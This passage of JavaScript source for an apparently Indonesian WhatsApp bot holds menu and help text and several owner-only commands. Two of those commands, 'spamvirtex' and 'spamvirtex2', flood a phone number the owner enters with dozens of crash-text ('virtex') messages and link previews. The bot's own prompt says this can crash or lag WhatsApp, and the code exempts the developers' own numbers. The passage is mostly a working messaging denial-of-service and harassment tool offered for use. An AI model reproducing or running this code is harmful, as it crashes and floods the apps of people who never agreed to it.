                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345ownermenu':  {
  	anu = `*✧ Owner Menu ✧*
  
  ➙ ${prefix}self 
  ➙ ${prefix}bc [teks]
  ➙ ${prefix}bcgc [teks]
  ➙ ${prefix}setbotpp _Reply image_
  ➙ ${prefix}join [link gc wa]
  ➙ ${prefix}out _in group chat_
  ➙ ${prefix}block [nomor]
  ➙ ${prefix}unblock [nomor]
  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
  ➙ ${prefix}okvirtex 
  ➙ ${prefix}spamvirtex [nomor] 
  ➙ =>
  ➙ >
  ➙ $
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
           case '12345aboutbot': {
           Pajrin.sendMessage(m.chat, { image:global.botlogo , caption: global.aboutbot }, { quoted: m })
           }
           break
           case '12345aboutdev': {
           Pajrin.sendMessage(m.chat, { image:global.logodev , caption: global.aboutdev }, { quoted: m })
           }
           break
           case '12345tosbot': {
           	m.reply(global.tosbot)
           }
           break
          case '12345how': {
          	m.reply(`〔 𝗧𝘂𝘁𝗼𝗿𝗶𝗮𝗹 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱/𝗣𝗲𝗿𝗶𝗻𝘁𝗮𝗵 𝗨𝗻𝘁𝘂𝗸 𝗕𝗢𝗧〕

   *き⃟🔍 [teks]*
Masukan teks apa aja, Jika terdapat argumen tersebut di command
𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}style [teks]
𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}style Gw anak sultan

   *き⃟🔍 [query]*
Masukan teks yang ingin di cari atau yang ingin di dapatkan
𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}play [query]
𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}play melukis senja

   *き⃟🔍 [url]*
Masukan url setelah command
𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}ytmp4 [url]
𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}ytmp4 https://youtu.be/KTrEsj20lWM

   *き⃟🔍 [nomor]*
Masukan nomor hp
𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}add [nomor]
𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}add ${global.pemilik}

   き⃟🔍 _Reply image_
   き⃟🔍 _Reply Foto_
 Reply Pesan berupa Foto dengan teks pesan command
𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}setppbot _Reply image_
𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}setppbot (sambil membalas pesan berisi Foto)


𝗠𝗔𝗦𝗜𝗛 𝗕𝗜𝗡𝗚𝗨𝗡𝗚?
 Jika masih bingung dengan argumen command, ketikan saja command nya, nanti muncul tutorial penggunaan dan contoh penggunaan nya
 𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 :${prefix}ytkomen [username+comment] _Reply image_
 
 MAKA KETIKAN SAJA ${prefix}ytkomen
NANTI BAKAL MUNCUL CARA PENGGUNAANNYA DAN CONTOH PENGGUNAANNYA  `)
          }
          break







case '12345okvirtex': {
	if (!isCreator) return reply(mess.owner)
            	anu = `${global.virtex}\n${global.virtex}`
  let message = await prepareWAMessageMedia({ video: fs.readFileSync('./BotMedia/menu.mp4'), gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `${global.virtex}\n${global.virtex}\n${global.virtex}\n${global.virtex}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: `TODD`,
                                    url: `${global.virtex}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '👤Owner👤',
                                    id: `${global.virtex}`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
              await sleep(3000)            
               Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(m.chat, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
  }
  
break

case '12345spamvirtex': {
	if (!isCreator) return reply(mess.owner)
	if (!text) throw `*Masukan nomor yg mau di spam virtex !*\n\n_Contoh:_ ${prefix + command} 628xxxxxxxxx`
	let buttons = [
                     {buttonId: `${prefix}spamvirtex2 GAS+${text}`, buttonText: {displayText: `LUNCURKAN VIRTEX ke ${text}`}, type: 1}
                ]

                let buttonMessage = {
                    text: `Bot akan meluncurkan 51 virtex ke nomor ${text}\n*Hal ini dapat memicu crash/lag pada aplikasi WhatsApp yang di pasang bot ini (jika tidak menggunakan wa imun)*\n\n*Tindakan ini juga  beresiko nomor bot terbanned oleh WhatsApp karena perbuatan spam !*\n  *UNTUK MELANJUTKAN TINDAKAN INI KLIK TOBOL DI BAWAH INI*`,
                    footer: `Klik tombol di bawah untuk melanjutkan, Untuk membatalkan abaikan pesan`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
}

break
case '12345spamvirtex2': {
tas = arg.split('+')[0]
              wah = arg.split('+')[1]
	if (!isCreator) return reply(mess.owner)
	if (!text) throw `*Masukan nomor yg mau di spam virtex !*\n\n_Contoh:_ ${prefix}spamvirtex2 GAS+628xxxxxxxxx`
            if (wah === '6283110011351') throw 'Itu nomor developer bot GOBLOK !!!'
            if (wah === '6285230122985') throw 'Itu nomor developer bot GOBLOK !!!'
	       if (wah === '6283161562525') throw 'Itu nomor developer bot GOBLOK !!!'
           if (wah === '6289630883352') throw 'Itu nomor developer bot GOBLOK !!!'

let message = await prepareWAMessageMedia({ video: fs.readFileSync('./BotMedia/menu.mp4'), gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: `${global.virtex}\n${global.virtex}`,
           hydratedFooterText: `${global.virtex}\n${global.virtex}\n${global.virtex}\n${global.virtex}`,
           hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.botnma}`,
                                    url: `copy ${global.virtex}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Excuse Me',
                                    id: `.copy ${global.virtex}`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                replay(`MEMPEROSES PELUNCURAN`)
    	             Pajrin.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          Pajrin.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
              await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
          Pajrin.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
            await sleep(3000)            
               Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
                Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
             await sleep(3000)            
              Pajrin.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
